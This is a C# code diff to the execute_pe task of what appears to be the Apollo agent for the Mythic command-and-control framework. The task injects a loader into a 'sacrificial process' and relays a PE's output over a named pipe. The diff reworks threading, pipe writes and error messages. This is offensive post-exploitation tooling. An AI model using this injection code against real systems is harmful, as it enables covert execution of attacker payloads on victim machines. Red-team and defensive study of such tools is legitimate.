@@ -22,6 +22,8 @@ using ApolloInterop.Utils;
 using System.Threading.Tasks;
 using ApolloInterop.Classes.Events;
 using System.ComponentModel;
+using ApolloInterop.Classes.Collections;
+using System.Linq;
 
 namespace Tasks
 {
@@ -48,50 +50,104 @@ namespace Tasks
         private AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
         private JsonSerializer _serializer = new JsonSerializer();
-        private ManualResetEvent _procExited = new(false);
-        private Task? _sendTask;
-        private Task? _flushTask;
-        private ConcurrentQueue<string> _outputQueue = new();
+        private AutoResetEvent _complete = new AutoResetEvent(false);
+        private Action<object> _sendAction;
+
+        private Action<object> _flushMessages;
+        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
+        private bool _completed = false;
+        private System.Threading.Tasks.Task flushTask;
         public execute_pe(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
-            _flushTask = Task.Factory.StartNew(() =>
+            _sendAction = (object p) =>
             {
-                while (WaitHandle.WaitAny([_cancellationToken.Token.WaitHandle, _procExited], 1000) == WaitHandle.WaitTimeout)
+                PipeStream ps = (PipeStream)p;
+                while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
                 {
-                    string output = "";
-                    while (_outputQueue.TryDequeue(out string data)) { output += data; }
+                    WaitHandle.WaitAny(new WaitHandle[]
+                    {
+                    _senderEvent,
+                    _cancellationToken.Token.WaitHandle
+                    });
+                    if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
+                    {
+                        try
+                        {
+                            ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
+                        }
+                        catch
+                        {
+                            ps.Close();
+                            _complete.Set();
+                            return;
+                        }
+
+                    }
+                    else if (!ps.IsConnected)
+                    {
+                        ps.Close();
+                        _complete.Set();
+                        return;
+                    }
+                }
+                ps.Close();
+                _complete.Set();
+            };
+
+            _flushMessages = (object p) =>
+            {
+                string output = "";
+                while (!_cancellationToken.IsCancellationRequested && !_completed)
+                {
+                    WaitHandle.WaitAny(new WaitHandle[]
+                    {
+                        _complete,
+                        _cancellationToken.Token.WaitHandle
+                    }, 2000);
+                    output = string.Join("", _assemblyOutput.Flush());
                     if (!string.IsNullOrEmpty(output))
                     {
                         _agent.GetTaskManager().AddTaskResponseToQueue(
                             CreateTaskResponse(
                                 output,
-                                false
-                            ));
+                                false,
+                                ""));
+                    }
+                }
+                while (true)
+                {
+                    System.Threading.Tasks.Task.Delay(1000).Wait(); // wait 1s
+                    output = string.Join("", _assemblyOutput.Flush());
+                    if (!string.IsNullOrEmpty(output))
+                    {
+                        _agent.GetTaskManager().AddTaskResponseToQueue(
+                            CreateTaskResponse(
+                                output,
+                                false,
+                                ""));
+                    }
+                    else
+                    {
+                        DebugHelp.DebugWriteLine($"no longer collecting output");
+                        return;
                     }
                 }
 
-                string finalOutput = "";
-                while (_outputQueue.TryDequeue(out string data)) { finalOutput += data; }
-                if (!string.IsNullOrEmpty(finalOutput))
-                {
-                    _agent.GetTaskManager().AddTaskResponseToQueue(
-                        CreateTaskResponse(
-                            finalOutput,
-                            false
-                        ));
-                }
-            });
+            };
         }
 
         public override void Kill()
         {
+            _completed = true;
+            _complete.Set();
+            flushTask.Wait();
             _cancellationToken.Cancel();
         }
 
 
         public override void Start()
         {
-            MythicTaskResponse? resp = null;
+            MythicTaskResponse resp;
             Process? proc = null;
             try
             {
@@ -135,7 +191,7 @@ namespace Tasks
                     throw new InvalidOperationException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId}");
                 }
 
-                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(true);
+                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
 
                 proc = _agent.GetProcessManager()
                     .NewProcess(
@@ -144,9 +200,9 @@ namespace Tasks
                         true
                     ) ?? throw new InvalidOperationException($"Process manager failed to create a new process {info.Application}");
 
-                proc.OutputDataReceived += Proc_DataReceived;
-                proc.ErrorDataReceieved += Proc_DataReceived;
-                proc.Exit += Proc_Exit;
+                //proc.OutputDataReceived += Proc_DataReceived;
+                //proc.ErrorDataReceieved += Proc_DataReceived;
+                //proc.Exit += Proc_Exit;
 
                 if (!proc.Start())
                 {
@@ -163,7 +219,7 @@ namespace Tasks
 
                 if (!proc.Inject(exePEPic))
                 {
-                    throw new InvalidOperationException($"Failed to inject assembly loader into sacrificial process.");
+                    throw new ExecuteAssemblyException($"Failed to inject loader into sacrificial process {info.Application}.");
                 }
 
                 _agent.GetTaskManager().AddTaskResponseToQueue(
@@ -183,11 +239,12 @@ namespace Tasks
 
                 var client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                 client.ConnectionEstablished += Client_ConnectionEstablished;
+                client.MessageReceived += Client_MessageReceived;
                 client.Disconnect += Client_Disconnet;
 
-                if (!client.Connect(5000))
+                if (!client.Connect(10000))
                 {
-                    throw new InvalidOperationException($"Failed to connect to named pipe.");
+                    throw new ExecuteAssemblyException($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
                 }
 
                 IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
@@ -197,28 +254,26 @@ namespace Tasks
                 }
 
                 _senderEvent.Set();
-
+                DebugHelp.DebugWriteLine("waiting for cancellation token in execute_pe.cs");
                 WaitHandle.WaitAny(
                 [
                     _cancellationToken.Token.WaitHandle,
-                    _procExited,
                 ]);
+                DebugHelp.DebugWriteLine("cancellation token activated in execute_pe.cs, returning completed");
+                resp = CreateTaskResponse("", true, "completed");
             }
             catch (Exception ex)
             {
-                resp = CreateTaskResponse($"{ex.Message}\n\nStack trace: {ex.StackTrace}", true, "error");
+                resp = CreateTaskResponse($"Unexpected Error\n{ex.Message}\n\nStack trace: {ex.StackTrace}", true, "error");
                 _cancellationToken.Cancel();
             }
-
-            var taskResponse = resp ??= CreateTaskResponse("", true, "completed");
 
             if (proc is Process procHandle)
             {
                 if (!procHandle.HasExited)
                 {
                     procHandle.Kill();
-                    taskResponse.Artifacts = [Artifact.ProcessKill((int)procHandle.PID)];
-                    procHandle.WaitForExit();
+                    resp.Artifacts = [Artifact.ProcessKill((int)procHandle.PID)];
                 }
 
                 if (procHandle.ExitCode != 0)
@@ -227,70 +282,61 @@ namespace Tasks
                         && procHandle.GetExitCodeHResult() is int exitCodeHResult)
                     {
                         var errorMessage = new Win32Exception(exitCodeHResult).Message;
-                        taskResponse.UserOutput = $"[*] Process exited with code: 0x{(uint)procHandle.ExitCode:x} - {errorMessage}";
-                        taskResponse.Status = "error";
+                        resp.UserOutput += $"\n[*] Process exited with code: 0x{(uint)procHandle.ExitCode:x} - {errorMessage}";
+                        resp.Status = "error";
                     }
                     else
                     {
-                        taskResponse.UserOutput = $"[*] Process exited with code: {procHandle.ExitCode} - 0x{(uint)procHandle.ExitCode:x}";
+                        resp.UserOutput += $"\n[*] Process exited with code: {procHandle.ExitCode} - 0x{(uint)procHandle.ExitCode:x}";
                     }
+                } else
+                {
+                    resp.UserOutput += $"\n[*] Process exited with code: 0x{(uint)procHandle.ExitCode:x}";
                 }
             }
 
-            Task.WaitAll([
-                _flushTask,
-                _sendTask,
-            ], 1000);
-
-            _agent.GetTaskManager().AddTaskResponseToQueue(taskResponse);
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
         private void Client_Disconnet(object sender, NamedPipeMessageArgs e)
         {
+            _completed = true;
+            _complete.Set();
+            flushTask.Wait();
             e.Pipe.Close();
+            _cancellationToken.Cancel();
         }
 
         private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
         {
-            _sendTask = Task.Factory.StartNew((state) =>
-            {
-                PipeStream pipe = (PipeStream)state;
-
-                if (WaitHandle.WaitAny(
-                [
-                    _cancellationToken.Token.WaitHandle,
-                    _procExited,
-                    _senderEvent
-                ]) == 2)
-                {
-                    while (pipe.IsConnected && _senderQueue.TryDequeue(out byte[] message))
-                    {
-                        pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
-                    }
-
-                    pipe.WaitForPipeDrain();
-                }
-            }, e.Pipe);
+            Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
+            flushTask = Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
         }
 
         public void OnAsyncMessageSent(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
-            pipe.EndWrite(result);
-            pipe.Flush();
-        }
-
-        private void Proc_DataReceived(object sender, StringDataEventArgs args)
-        {
-            if (!string.IsNullOrEmpty(args.Data))
+            // Potentially delete this since theoretically the sender Task does everything
+            if (pipe.IsConnected && !_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
             {
-                _outputQueue.Enqueue(args.Data);
+                try
+                {
+                    pipe.EndWrite(result);
+                    pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
+                }
+                catch
+                {
+
+                }
+
             }
         }
-
-        private void Proc_Exit(object sender, EventArgs e)
+        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
         {
-            _procExited.Set();
+            IPCData d = e.Data;
+            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
+            DebugHelp.DebugWriteLine($"adding data to output");
+            _assemblyOutput.Add(msg);
         }
     }
 }
